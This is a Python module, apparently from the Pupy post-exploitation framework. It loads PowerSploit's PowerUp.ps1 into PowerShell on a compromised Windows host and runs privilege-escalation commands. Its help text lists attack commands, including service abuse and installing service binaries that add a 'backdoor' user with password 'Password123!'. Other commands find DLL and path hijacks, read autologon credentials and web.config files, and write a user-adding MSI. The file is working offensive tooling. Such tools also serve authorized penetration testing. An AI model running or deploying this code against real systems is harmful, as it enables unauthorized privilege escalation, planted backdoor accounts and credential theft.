# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os

__class_name__="PowerUp"
ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))

@config(compat="windows", category="privesc")
class PowerUp(PupyModule):
    """ trying common Windows privilege escalation methods"""

    dependencies = {
        'windows': [ 'powershell' ]
    }

    def init_argparse(self):
        commands_available = '''
Commandes available:\n
'"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile
Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC
Invoke-ServiceStart -ServiceName VulnSVC
Invoke-ServiceStop -ServiceName VulnSVC
Invoke-ServiceEnable -ServiceName VulnSVC
Invoke-ServiceDisable -ServiceName VulnSVC
$services = Get-ServiceUnquoted
Get-ServiceFilePermission
Get-ServicePermission
Get-ServiceDetail -ServiceName VulnSVC
Invoke-ServiceAbuse -ServiceName VulnSVC
Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john"
Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."
Write-ServiceBinary -ServiceName VulnSVC
Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
Write-ServiceBinary -ServiceName VulnSVC -Command "net ..."
Install-ServiceBinary -ServiceName VulnSVC
Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."
Restore-ServiceBinary -ServiceName VulnSVC
Find-DLLHijack
Find-DLLHijack -ExcludeWindows -ExcludeProgramFiles
Find-DLLHijack -ExcludeOwned
Find-PathHijack
Get-RegAlwaysInstallElevated
Get-RegAutoLogon
Get-VulnAutoRun
Get-VulnSchTask
Get-UnattendedInstallFile
get-webconfig
get-webconfig | Format-Table -Autosize
get-ApplicationHost
get-ApplicationHost | Format-Table -Autosize
Write-UserAddMSI
Invoke-AllChecks
'''

        self.arg_parser = PupyArgumentParser(prog="PowerUp", description=self.__doc__, epilog=commands_available)
        self.arg_parser.add_argument("-1", '--once', action='store_true', help='Unload after execution')
        self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-AllChecks', help='default: Invoke-AllChecks')

    def run(self, args):
        script = 'powerup'

        powershell = self.client.conn.modules['powershell']

        if not powershell.loaded(script):
            with open(os.path.join(ROOT, 'external', 'PowerSploit', 'Privesc', 'PowerUp.ps1')) as content:
                width, _ = consize()
                powershell.load(script, content.read(), width=width)

        output, rest = powershell.call(script, args.command)
        if args.once:
            powershell.unload(script)

        if rest:
            self.error(rest)

        if output:
            while '\n\n\n' in output:
                output = output.replace('\n\n\n', '\n\n')

            self.log(output)
